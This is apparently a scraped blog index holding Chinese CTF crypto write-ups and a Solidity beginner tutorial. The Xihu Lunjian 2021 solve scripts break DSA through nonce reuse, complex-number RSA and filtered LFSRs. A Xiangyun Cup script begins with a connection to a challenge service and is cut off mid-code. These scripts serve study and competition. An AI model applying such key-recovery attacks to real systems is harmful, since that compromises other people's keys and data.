57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425 c1= 78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059 y = 449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839 g = 2 x = sympy.discrete_log(y, c1, g) p = sympy.symbols(\u0026#34;p\u0026#34;) a = sympy.solve([2019*p**2 + 2020*p**3 + 2021*p**4-x], [p]) #print(a) p = 12131601165788024635030034921084070470053842112984866821070395281728468805072716002494427632757418621194662541766157553264889658892783635499016425528807741 m = pow(c, dp, p) print(long_to_bytes(m)) unknown_dsa # 听说要用什么勾八佩尔方程做\n咱们大专人下人也不懂那些\n直接连分数一把梭哈👨‍🎓👨‍🎓👨‍🎓\n连分数打重要参数\n#! /usr/bin/sage from gmpy2 import iroot from icecream import * from sage.all import * from sage.groups.generic import bsgs from Crypto.Util.number import * w = [3912956711, 4013184893, 3260747771] c1 = [2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704, 21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961, 301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424] c2 = [148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144, 1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256, 10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842] def finduv(w): # w = 3912956711 sqrt_w = sqrt(w).n(2000) print(sqrt_w) for uv in continued_fraction(sqrt_w).convergents(): u = uv.numerator() v = uv.denominator() # input() # ic(u,v) if(u**2 - w*v**2\u0026lt;20 and u**2 - w*v**2\u0026gt;0): ic(u,v) ic(u**2 - w*v**2) return u,v uu=[] vv =[] for wi in w: u,v = finduv(wi) uu.append(u) vv.append(v) print(len(uu),len(vv)) print(uu) print(vv) \u0026#39;\u0026#39;\u0026#39; uu = [3246103877570376338979874480058302388590234989573846048429589091918737949572620392050082083210013471538484670450175602957972442230909, 121723653124334943327337351369224143389428692536182586690052931548156177466437320964701609590004825981378294358781446032392886186351422728173975231719924841105480990927174913175897972732532233, 1440176324831562539183617425199117363244429114385437232965257039323873256269894716229817484088631407074328498896710966713912857642565350306252498754145253802734893404773499918668829576304890397994277568525506501428687843547083479356423917301477033624346211335450] vv = [51893133018606205089677829160555654307824024355546397002081760065608182810917693193575928567213487534685441075575788061525676783, 1921455776649552079281304558665818887261070948261008212148121820969448652705855804423423681848341600084863078530401518931263150887409200101780191600802601105030806253998955929263882382004, 25220695816897075916217095856631009012504127590059436393692101250418226097323331193222730091563032067314889286051745468263446649323295355350101318199942950223572194027189199046045156046295274639977052585768365501640340023356756783359924935106074017605019787] w = [3912956711, 4013184893, 3260747771] cu = [2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704, 21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961, 301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424] cv = [148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144, 1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256, 10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842] ans1 = int(crt(cv,vv)) print(iroot(ans1,int(7))) m2 = 10336852405630488944198347577475266693234960398137850045398990629116544863921454 uu2 = [iroot(int(1+w[i]*vv[i]**2),int(2)) for i in range(3)] print(uu2) print(uu) \u0026#39;\u0026#39;\u0026#39; 喜闻乐见打DSA\n# from sage.all import * # from sage.groups.generic import bsgs from Crypto.Util.number import * from Crypto.PublicKey import DSA from Crypto.Hash import SHA from gmpy2 import invert,powmod,iroot import random from Crypto.Util.number import * m1=b\u0026#39;Hello, this is the first message.\u0026#39; m2=b\u0026#39;YES!! that is the second message.\u0026#39; n, t, invg, = 85198615386075607567070020969981777827671873654631200472078241980737834438897900146248840279191139156416537108399682874370629888207334506237040017838313558911275073904148451540255705818477581182866269413018263079858680221647341680762989080418039972704759003343616652475438155806858735982352930771244880990190318526933267455248913782297991685041187565140859, 106239950213206316301683907545763916336055243955706210944736472425965200103461421781804731678430116333702099777855279469137219165293725500887590280355973107580745212368937514070059991848948031718253804694621821734957604838125210951711527151265000736896607029198, 60132176395922896902518845244051065417143507550519860211077965501783315971109433544482411208238485135554065241864956361676878220342500208011089383751225437417049893725546176799417188875972677293680033005399883113531193705353404892141811493415079755456185858889801456386910892239869732805273879281094613329645326287205736614546311143635580051444446576104548 r1, s1, s2 = 498841194617327650445431051685964174399227739376, 376599166921876118994132185660203151983500670896, 187705159843973102963593151204361139335048329243 r2, s3 = 620827881415493136309071302986914844220776856282, 674735360250004315267988424435741132047607535029 h1 = bytes_to_long(SHA.new(m1).digest()) h2 = bytes_to_long(SHA.new(m2).digest()) # 解方程 \u0026#39;\u0026#39;\u0026#39; a=1 b=-1 c=-n*t delta = b**2-4*a*c print(delta) print(iroot(delta,2)) p = (-b+iroot(delta,2)[0])//(2*a) \u0026#39;\u0026#39;\u0026#39; q = 895513916279543445314258868563331268261201605181 p = 95139353880772104939870618145448234251031105153406565833029787299040378395002190438381537974853777890692924407167823818980082672873538133127131356810153012924025270883966172420658777903337576027105954119811495411149092960422055445121097259802686960288258399754185484307350305454788837702363971523085335074839 k = (h1-h2)*inverse(s1-s2,q) x1 = ((s1*k-h1)*inverse(r1,q))%q print(x1) flag=b\u0026#39;\u0026#39; flag+=long_to_bytes(x1) # b\u0026#39;DASCTF{f11bad18f5297\u0026#39; x1 = 389668174084597613214310991510959871854822701367 g = inverse(invg,n) r2 = powmod(g, x1, p) % q x2 = ((s3*k-h1)*inverse(r2,q))%q print(x2) flag+=long_to_bytes(x2) print(flag) q = 895513916279543445314258868563331268261201605181 p = 95139353880772104939870618145448234251031105153406565833029787299040378395002190438381537974853777890692924407167823818980082672873538133127131356810153012924025270883966172420658777903337576027105954119811495411149092960422055445121097259802686960288258399754185484307350305454788837702363971523085335074839 # DASCTF{f11bad18f529750fe52c56eed85d001b} SpecialCurve2 # 这个还有点意思，感觉是某研究生👴拿来搞心态的\n好难好难好难\n把底层大专鼠鼠难住了捏\nsrc\nfrom Crypto.Util.number import * # from flag import flag import random def add(P1,P2): x1,y1=P1 x2,y2=P2 x3=(x1*x2-y1*y2)%n y3=(x1*y2+x2*y1)%n return (x3,y3) def mul(P,k): assert k\u0026gt;=0 Q=(1,0) while k\u0026gt;0: if k%2: k-=1 Q=add(P,Q) else: k//=2 P=add(P,P) return Q def getMyPrime(): while True: q=getPrime(88) p=2*q+1 if isPrime(p): return p e=getPrime(256) n=getMyPrime()*getMyPrime()*getMyPrime() print(\u0026#39;n=%d\u0026#39;%n) G=(1,1) # HINT=mul(G,e) g=G Q=(1,0) for i in range(10): g=add(g,Q) print(i,g) print(add(G,G)) print(mul(G,3)) print(mul(G,8)) # print(\u0026#39;HINT=%s\u0026#39;%str(HINT)) # x=bytes_to_long(flag[7:39]) # y=bytes_to_long(flag[39:-1]) # M=(x,y) # C=mul(M,e) # print(\u0026#39;C=%s\u0026#39;%str(C)) \u0026#39;\u0026#39;\u0026#39; n=92916331959725072239888159454032910975918656644816711315436128106147081837990823 HINT=(1225348982571480649501200428324593233958863708041772597837722864848672736148168, 1225348982571480649501200428324593233958863708041772597837722864848672736148168) C=(44449540438169324776115009805536158060439126505148790545560105884100348391877176, 73284708680726118305136396988078557189299357177640330968917927635171441710392723) \u0026#39;\u0026#39;\u0026#39; 学习复旦大哥博客得知这玩意是\n复数域上的离散对数问题+复数RSA：\n$(X_1+iY_1)(X_2+iY_2)=X_1X_2 + i^2(Y_1Y_2) + i(X_1Y_2+X_2Y_1)$\n$=X_1X_2 -(Y_1Y_2) + i(X_1Y_2+X_2Y_1)$\n所以，X存放的是实部，Y存放虚部。。。\n简写下来就是这样\n$Z^e=(X+iY)^e\\pmod{n}$\n这里e没给，想要先求离散对数拿e\n这里的算法是将实数和复数提出来构建到坐标轴上计算\n这样一来所有计算就都在实数上了\n$cip=\\sqrt{x^2+y^2}$\n$cip^2=x^2+y^2$\n$G=(1,1),OG=1+1=2$\n$x^2+y^2=(1+1)^e=OC = OG^e\\pmod{N}$\n# SageMath script mod = 92916331959725072239888159454032910975918656644816711315436128106147081837990823 cipher = 1225348982571480649501200428324593233958863708041772597837722864848672736148168^2*2%mod base = 2 e = pari(f\u0026#34;znlog({cipher},Mod({base},{mod}))\u0026#34;) print(e) exp\nfrom Crypto.Util.number import long_to_bytes import gmpy2 def add(P1,P2): x1,y1=P1 x2,y2=P2 x3=(x1*x2-y1*y2)%n y3=(x1*y2+x2*y1)%n return (x3,y3) def mul(P,k): assert k\u0026gt;=0 Q=(1,0) while k\u0026gt;0: if k%2: k-=1 Q=add(P,Q) else: k//=2 P=add(P,P) return Q n=92916331959725072239888159454032910975918656644816711315436128106147081837990823 HINT=(1225348982571480649501200428324593233958863708041772597837722864848672736148168, 1225348982571480649501200428324593233958863708041772597837722864848672736148168) C=(44449540438169324776115009805536158060439126505148790545560105884100348391877176, 73284708680726118305136396988078557189299357177640330968917927635171441710392723) from Crypto.Util.number import long_to_bytes import gmpy2 e = 96564183954285580248216944343172776827819893296479821021220123492652817873253 # sage: factor(92916331959725072239888159454032910975918656644816 # ....: 711315436128106147081837990823) # 425886199617876462796191899 * 434321947632744071481092243 * 502327221194518528553936039 p = [425886199617876462796191899, 434321947632744071481092243, 502327221194518528553936039] phi = (p[0]**2-1)*(p[1]**2-1)*(p[2]**2-1) d = gmpy2.invert(e, phi) M = mul(C,d) print(mul(M,e)==C) # assert mul(G,e)==HINT print(long_to_bytes(M[0])+long_to_bytes(M[1])) # True # b\u0026#39;47f4f203afe894ddbb1bcf6368d901cf93990354dadbc5b7794e199d4f0b59cb\u0026#39; FilterRandom # 加了层的套娃lfsr\nsrc\nimport random from secret import init1,init2,flag class lfsr(): def __init__(self, state, mask, length): self.state = state self.mask = mask self.lengthmask = 2**length-1 def next(self): nextdata = (self.state \u0026lt;\u0026lt; 1) \u0026amp; self.lengthmask tmp = self.state \u0026amp; self.mask \u0026amp; self.lengthmask output = 0 while tmp != 0: output ^= (tmp \u0026amp; 1) tmp = tmp \u0026gt;\u0026gt; 1 nextdata ^= output self.state = nextdata return output def my_filter(c1,c2): if random.random()\u0026gt;0.1: return str(c1) else: return str(c2) N=64 mask1=random.getrandbits(N) mask2=random.getrandbits(N) print(mask1) print(mask2) l1=lfsr(init1,mask1,N) l2=lfsr(init2,mask2,N) output=\u0026#39;\u0026#39; for i in range(2048): output+=my_filter(l1.next(),l2.next()) print(output) \u0026#39;\u0026#39;\u0026#39; 17638491756192425134 14623996511862197922 10001011010100011000100101001011100010110111001100001110000111011011100101101101000111101100010111100011000011111111010101111100101010101100010100000111011010011110111000100000101100101010110100111100011000101010101011011111011011000001101001011000010000011110001111001111011100110011111111101000111101001010000110001110111101001001101011101101001010001101010010110000000000001001101100101011110011010110011010110110011001001111001010100011110111100100010110111100110010000000010010011110001100000011000001110001000000010000100100101100000011100000011110101001011010011010100001101000010100100000011001011001000110000000000111011101000110010110111110010101110010001010001111111000011010000011001110111001000010011000000111010111100000100010011001111101110110100100011111000111000011111101010010110011111100010000100101011000001010101111101111001000011101111000111000101011010111100110001011011100101001010110110110110011100100111100110001101110010100010111100000110000010110100010001100011011001100100110101110010100011101110110010000010011100000011100000101010011011111110000100000010001010111011011111110100111100011100011110110010001011101111001011101010110111001001000111001001111001111110111111100001111100100110011111110110101000011010111110010001100000111100010011100011010000101010111010101101000011001110011000000110110110001101100110101110010010111011100110101000110000011001010100000110000000001110010001010001001101111100001111111011010010011100110010000111010001001111111110000010101110011010100100101101100111000010110100110010001010110111110011000111011101110100010000110110110011001011111011111000000000000001110000001000011000110111000000110100110110001111011111100010010011100101010000111000011111010000001010010011101010010110011000000001111110000000010111011000010001111000100110101110001000011111001101111111100011111011001001110000101001101110100111010011011101000110010000001001000001100110001110101100001000110100100010111101100010100110011111010011100100001101111010000110110101111111001111011100001101100000001101111100100 \u0026#39;\u0026#39;\u0026#39; 两个64位的lfsr，设为s1,s2,加了个滤波，也就是random()\u0026gt;0.1时，输出s1,否则输出s2。认为random很随机，那么所有输出的很大一部分都是来自于s1,那么应该有连续64个输出同时来自于s1。也就是知道lfsr的一个现态，可以逆lfsr回溯到初态，再利用次初态生成输出流，若与题目中输出流相符程度很大，则可认为此时的初态是正确的。\n对于逆lfsr，异或矩阵直接梭哈\n嫖代码\nclass lfsr(): def __init__(self, init, mask, length): self.init = init self.mask = mask self.lengthmask = 2**length-1 def next(self): nextdata = (self.init \u0026lt;\u0026lt; 1) \u0026amp; self.lengthmask i = self.init \u0026amp; self.mask \u0026amp; self.lengthmask output = 0 while i != 0: output ^= (i \u0026amp; 1) i = i \u0026gt;\u0026gt; 1 nextdata ^= output self.init = nextdata return output output=\u0026#39;10001011010100011000100101001011100010110111001100001110000111011011100101101101000111101100010111100011000011111111010101111100101010101100010100000111011010011110111000100000101100101010110100111100011000101010101011011111011011000001101001011000010000011110001111001111011100110011111111101000111101001010000110001110111101001001101011101101001010001101010010110000000000001001101100101011110011010110011010110110011001001111001010100011110111100100010110111100110010000000010010011110001100000011000001110001000000010000100100101100000011100000011110101001011010011010100001101000010100100000011001011001000110000000000111011101000110010110111110010101110010001010001111111000011010000011001110111001000010011000000111010111100000100010011001111101110110100100011111000111000011111101010010110011111100010000100101011000001010101111101111001000011101111000111000101011010111100110001011011100101001010110110110110011100100111100110001101110010100010111100000110000010110100010001100011011001100100110101110010100011101110110010000010011100000011100000101010011011111110000100000010001010111011011111110100111100011100011110110010001011101111001011101010110111001001000111001001111001111110111111100001111100100110011111110110101000011010111110010001100000111100010011100011010000101010111010101101000011001110011000000110110110001101100110101110010010111011100110101000110000011001010100000110000000001110010001010001001101111100001111111011010010011100110010000111010001001111111110000010101110011010100100101101100111000010110100110010001010110111110011000111011101110100010000110110110011001011111011111000000000000001110000001000011000110111000000110100110110001111011111100010010011100101010000111000011111010000001010010011101010010110011000000001111110000000010111011000010001111000100110101110001000011111001101111111100011111011001001110000101001101110100111010011011101000110010000001001000001100110001110101100001000110100100010111101100010100110011111010011100100001101111010000110110101111111001111011100001101100000001101111100100\u0026#39; mask1=17638491756192425134 mask2=14623996511862197922 N=64 def delfsr(rounds,init,mask): for j in range(rounds+N): t=init%2 init=init\u0026gt;\u0026gt;1 t^=bin(init\u0026amp;mask)[2:].count(\u0026#39;1\u0026#39;)%2 init=(t\u0026lt;\u0026lt;(N-1))+init return init def correlation(A,B): assert len(A)==len(B) N=2048 d=0 for i in range(len(A)): if A[i]==B[i]: d+=1 return d/N def guess_init1(output,mask): possible,max_p=0,0.0 for i in range(0,len(output)-N): init=int(output[i:i+N],2) init=delfsr(i,init,mask) LFSR=lfsr(init,mask,N) out=\u0026#39;\u0026#39; for i in range(2048): out+=str(LFSR.next()) p=correlation(out,output) if p\u0026gt;max_p: possible,max_p=init,p print(\u0026#39;possible: \u0026#39;,possible) print(\u0026#39;max_p: \u0026#39;,max_p) return possible init1=guess_init1(output,mask1) #15401137114601469828 \u0026#39;\u0026#39;\u0026#39; possible: 15401137114601469828 max_p: 0.9453125 \u0026#39;\u0026#39;\u0026#39; init1=15401137114601469828 LFSR=lfsr(init1,mask1,N) \u0026#39;\u0026#39;\u0026#39; known=[] for i in range(2048): o=LFSR.next() if o !=int(output[i]): known.append((i,int(output[i]))) #print(known) \u0026#39;\u0026#39;\u0026#39; known=[(4, 1), (12, 0), (30, 1), (37, 0), (41, 1), (53, 1), (69, 0), (85, 1), (97, 1), (101, 0), (146, 0), (148, 0), (193, 0), (196, 1), (260, 0), (281, 0), (341, 1), (357, 1), (390, 1), (407, 0), (428, 0), (431, 0), (438, 1), (477, 1), (520, 0), (523, 0), (529, 0), (539, 0), (541, 1), (566, 0), (607, 1), (613, 0), (619, 0), (623, 1), (640, 0), (660, 1), (733, 0), (750, 0), (811, 0), (816, 0), (824, 0), (873, 1), (887, 0), (906, 1), (910, 0), (939, 0), (948, 0), (959, 0), (971, 1), (977, 0), (1001, 1), (1026, 1), (1030, 0), (1046, 0), (1052, 0), (1078, 0), (1082, 0), (1109, 1), (1120, 0), (1126, 0), (1137, 1), (1158, 1), (1163, 0), (1194, 1), (1195, 1), (1222, 1), (1237, 1), (1244, 1), (1280, 0), (1286, 0), (1311, 1), (1345, 1), (1391, 0), (1401, 0), (1415, 0), (1440, 1), (1456, 0), (1495, 1), (1506, 0), (1518, 0), (1532, 1), (1535, 1), (1571, 1), (1612, 0), (1619, 0), (1624, 1), (1642, 0), (1646, 1), (1654, 0), (1709, 0), (1718, 0), (1745, 0), (1764, 0), (1792, 0), (1797, 1), (1834, 1), (1848, 1), (1855, 1), (1861, 1), (1871, 0), (1894, 0), (1901, 0), (1906, 1), (1925, 0), (1950, 0), (1967, 0), (1970, 0), (1979, 0), (2026, 1), (2027, 1), (2036, 1), (2046, 0)] M = block_matrix(Zmod(2), [Matrix([0] * 63), identity_matrix(63)], nrows = 2, subdivide = False) mask = mask2.digits(2)[::-1] mask = Matrix(Zmod(2), mask).T M = block_matrix(Zmod(2), [M, mask], ncols = 2, subdivide = False) A = [] for index, out in known: A.append((M^index*mask).list()) A = Matrix(Zmod(2), A).T y = vector(Zmod(2), [x[1] for x in known]) init=A.solve_left(y).list() print(int(\u0026#39;\u0026#39;.join([str(i) for i in init]),2)) #11256716742701089092 还有个啥题 叫啥wiener # 记得到时候去嫖脚本👨‍🦳 ","date":"15 December 2021","permalink":"/achieve/ctf/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021crypto/","section":"archive","summary":"","title":"Document for 西湖论🗡🔪⚔🖋✂"},{"content":"\rA Simple Smart Contract # To access a member (like a state variable) of the current contract, you do not typically add the this. prefix, you just access it directly via its name. Unlike in some other languages, omitting it is not just a matter of style, it results in a completely different way to access the member, but more on this later.\nremix使用的三种环境，分别指:\njs VM:remix自带的sandbox环境练习环境 虚拟了一个节点 inject web3和provider web3都是想要连接真实节点 连接matemask一般用 inject web3\n连接ganache的本地虚拟用provider web3?\n先搞一个数据存入storedata,get函数取出\n练习平台 # https://cryptozombies.io/zh/\n一个solidity练习平台，有点像js\nstage1 # 基础+event\npragma solidity ^0.4.19; contract ZombieFactory { //event 是合约和区块链通讯的一种机制。你的前端应用“监听”某些事件，并做出反应。 event NewZombie(uint zombieId, string name, uint dna); uint dnaDigits = 16; uint dnaModulus = 10 ** dnaDigits; struct Zombie { string name; uint dna; } Zombie[] public zombies; function _createZombie(string _name, uint _dna) private { //array.push() - 1 将是我们加入的僵尸的索引。 //zombies.push() - 1 就是 id，数据类型是 uint。 uint id = zombies.push(Zombie(_name, _dna)) - 1; NewZombie(id, _name, _dna); } //函数修饰符 //view 意味着它只能读取数据不能更改数据 function _generateRandomDna(string _str) private view returns (uint) { //Ethereum 内部有一个散列函数keccak256，它用了SHA3版本。 uint rand = uint(keccak256(_str)); return rand % dnaModulus; } function createRandomZombie(string _name) public { uint randDna = _generateRandomDna(_name); _createZombie(_name, randDna); } } Solidity 还支持 pure 函数, 表明这个函数甚至都不访问应用里的数据，例如：\nfunction _multiply(uint a, uint b) private pure returns (uint) { return a * b; } stage2 # addresses （地址 # 以太坊区块链由 _ account _ (账户)组成，你可以把它想象成银行账户。一个帐户的余额是 ETH （在以太坊区块链上使用的币种），你可以和其他帐户之间支付和接受以太币，就像你的银行帐户可以电汇资金到其他银行帐户一样。\n每个帐户都有一个“地址”，你可以把它想象成银行账号。这是账户唯一的标识符，它看起来长这样：\n0x0cE446255506E92DF41614C46F1d6df9Cc969183\n此处的address是一种独立的数据类型\nMapping（映射） # 在第1课中，我们看到了 _ 结构体 _ 和 _ 数组 _ 。 映射 是另一种在 Solidity 中存储有组织数据的方法。\n类似于python的字典，支持通过key查找value\n//对于金融应用程序，将用户的余额保存在一个 uint类型的变量中： mapping (address =\u0026gt; uint) public accountBalance; //或者可以用来通过userId 存储/查找的用户名 mapping (uint =\u0026gt; string) userIdToName; msg.sender # 在 Solidity 中，有一些全局变量可以被所有函数调用。 其中一个就是 msg.sender，它指的是当前调用者（或智能合约）的 addres(即creator or admin)\nrequire # 这玩意类似python的断言，若为假则会停止执行,并重置require管辖区域的修改\n继承（Inheritance） # 当代码过于冗长的时候，最好将代码和逻辑分拆到多个不同的合约中，以便于管理。\n有个让 Solidity 的代码易于管理的功能，就是合约 inheritance (继承)：\ncontract Doge { function catchphrase() public returns (string) { return \u0026#34;So Wow CryptoDoge\u0026#34;; } } contract BabyDoge is Doge { function anotherCatchphrase() public returns (string) { return \u0026#34;Such Moon BabyDoge\u0026#34;; } } Storage与Memory # Storage 变量是指永久存储在区块链中的变量。 Memory 变量则是临时的，当外部函数对某合约调用完成时，内存型变量即被移除。 你可以把它想象成存储在你电脑的硬盘或是RAM中数据的关系\n函数可见性 # 我们尝试从 ZombieFeeding 中调用 _createZombie 函数，但 _createZombie 却是 ZombieFactory 的 private （私有）函数。\ninternal 和 private 类似，不过， 如果某个合约继承自其父合约，这个合约即可以访问父合约中定义的“内部”函数。\nexternal 与public 类似，只不过这些函数只能在合约之外调用\npragma solidity ^0.4.19; import \u0026#34;./zombiefactory.sol\u0026#34;; contract ZombieFeeding is ZombieFactory { function feedAndMultiply(uint _zombieId, uint _targetDna) public { require(msg.sender == zombieToOwner[_zombieId]); Zombie storage myZombie = zombies[_zombieId]; _targetDna = _targetDna % dnaModulus; uint newDna = (myZombie.dna + _targetDna) / 2; _createZombie(\u0026#34;NoName\u0026#34;, newDna); } } ----- function _createZombie(string _name, uint _dna) internal { uint id = zombies.push(Zombie(_name, _dna)) - 1; zombieToOwner[id] = msg.sender; ownerZombieCount[msg.sender]++; NewZombie(id, _name, _dna); } ---- 与其他合约的交互 # 如果我们的合约需要和区块链上的其他的合约会话，则需先定义一个 interface (接口)。\n先举一个简单的栗子。 假设在区块链上有这么一个合约：\ncontract LuckyNumber { mapping(address =\u0026gt; uint) numbers; function setNum(uint _num) public { numbers[msg.sender] = _num; } function getNum(address _myAddress) public view returns (uint) { return numbers[_myAddress]; } } 这是个很简单的合约，您可以用它存储自己的幸运号码，并将其与您的以太坊地址关联。 这样其他人就可以通过您的地址查找您的幸运号码了。\n现在假设我们有一个外部合约，使用 getNum 函数可读取其中的数据。\n首先，我们定义 LuckyNumber 合约的 interface ：\ncontract NumberInterface { function getNum(address _myAddress) public view returns (uint); } 请注意，这个过程虽然看起来像在定义一个合约，但其实内里不同：\n首先，我们只声明了要与之交互的函数 —— 在本例中为 getNum —— 在其中我们没有使用到任何其他的函数或状态变量。\n其次，我们并没有使用大括号（{ 和 }）定义函数体，我们单单用分号（;）结束了函数声明。这使它看起来像一个合约框架。\n编译器就是靠这些特征认出它是一个接口的。\n使用接口 # 继续前面 NumberInterface 的例子，我们既然将接口定义为：\ncontract NumberInterface { function getNum(address _myAddress) public view returns (uint); } 我们可以在合约中这样使用：\ncontract MyContract { address NumberInterfaceAddress = 0xab38... // ^ The address of the FavoriteNumber contract on Ethereum NumberInterface numberContract = NumberInterface(NumberInterfaceAddress); // Now `numberContract` is pointing to the other contract function someFunction() public { // Now we can call `getNum` from that contract: //利用接口来访问其他地址中的合约,(solidity特有交互模式) uint num = numberContract.getNum(msg.sender); // ...and do something with `num` here } } 通过这种方式，只要将您合约的可见性设置为public(公共)或external(外部)，它们就可以与以太坊区块链上的任何其他合约进行交互。\nNumberInterface numberContract = NumberInterface(NumberInterfaceAddress);\n至此，我们掌握了基本的交互方法，可以尝试去完成一些测试链的智能合约操作了\n哦，注意一下，在开始前，最好找大哥们要一点测试链的ETH存入matemask以作为gas😀😀😀\n处理返回值 # 像python一样,sodity可以处理大量的返回值\nfunction processMultipleReturns() external { uint a; uint b; uint c; // 这样来做批量赋值: (a, b, c) = multipleReturns(); } // 或者如果我们只想返回其中一个变量: function getLastReturnValue() external { uint c; // 可以对其他字段留空: (,,c) = multipleReturns(); } ","date":"27 November 2021","permalink":"/achieve/2019to2021/solidity-document/","section":"archive","summary":"","title":"A tour of solidity"},{"content":"\r祥云ber secret_share # 下午来推了一半就出去吃东西去了😘😘\n看了wp发现只要几个步骤串起来其实不难的，可能是因为我只会炼丹吧。。。\n基本加解密：\nenc\n$E = g^e\\mod p,V=g^v\\mod p\\ s = v+e(h2(E||V))$\n$c = m*pk^{e+v}\\mod p$\nr_enc:\n$E_- = g^{e\\times skI\\times dd} , V_-=g^{v\\times skI\\times dd}$\n$E = g^{e},V=g^{v}$\n$c = m\\times (EV)^{skI}\\mod p =m\\times (E_-V_-)^{inv(dd,p-1)}\\mod p$\n这里拿到dd就可以搞解密了，解dd的前提是吧encoder搞清楚\nencoder当时没细看，其实变化写完了一看就很简单了\n照着👴们的消元学习了\n连续4次推得sk拿到随机出来的m可以得到\n$mul={sk}^4\\cdot dd_1\\cdot dd_2\\cdot dd_3\\cdot dd_4%p$\n$dd_i$是已知的,有些solve是域下开根\n有些是神仙炫技直接 韦达定理 或者 费玛大定理\n拿到单独的sk后就可以搞事情了\nEV都是已知，c也已知 直接算就🆗了\nsolve-step1\nfrom Crypto.Util.number import * from icecream import * from hashlib import sha256 from gmpy2 import * import libnum from pwn import * from libnum import * def h2(m): return int(sha256(m).hexdigest(), 16) io=remote(\u0026#39;0.0.0.0\u0026#39;,10001) #1 io.recvuntil(\u0026#39;choice\u0026gt;\u0026#39;) io.sendline(\u0026#39;1\u0026#39;) io.recvuntil(\u0026#39;Please take good care of it!\\n\u0026#39;) pk_sk=io.recvuntil(\u0026#39;\\n\u0026#39;)[:-1].decode()[2:-1].split(\u0026#39;L,0x\u0026#39;) pk,sk=int(pk_sk[0],16),int(pk_sk[1],16) #2 io.recvuntil(\u0026#39;choice\u0026gt;\u0026#39;) io.sendline(\u0026#39;2\u0026#39;) pp, g = 0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3, 0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577 group_list = [32, 64, 128, 256] DD=1 for group in group_list: io.recvuntil(\u0026#39;The cipher shared to you\\n\u0026#39;) cc=int(io.recvuntil(\u0026#39;L, \u0026#39;)[1:-3]) new_cipher=[cc] new_cipher+=eval(io.recvuntil(\u0026#39;)\\n\u0026#39;)[:-2].decode().replace(\u0026#39;L\u0026#39;,\u0026#39;\u0026#39;)) 